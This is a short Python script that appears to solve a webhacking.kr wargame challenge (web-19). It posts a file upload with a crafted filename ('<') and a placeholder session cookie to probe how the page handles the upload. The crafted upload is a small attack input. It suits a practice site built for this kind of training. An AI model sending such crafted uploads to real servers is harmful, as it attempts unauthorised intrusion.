import requests

PHPSESSID = "SESSION_HERE"
URL = "http://webhacking.kr/challenge/web/web-19/index.php"

files = {
    'up': ('<', 'hello', 'application/octet-stream')
}

cookies = {
    'PHPSESSID': PHPSESSID
}

r = requests.post(URL, files=files, cookies=cookies)
print(r.text)
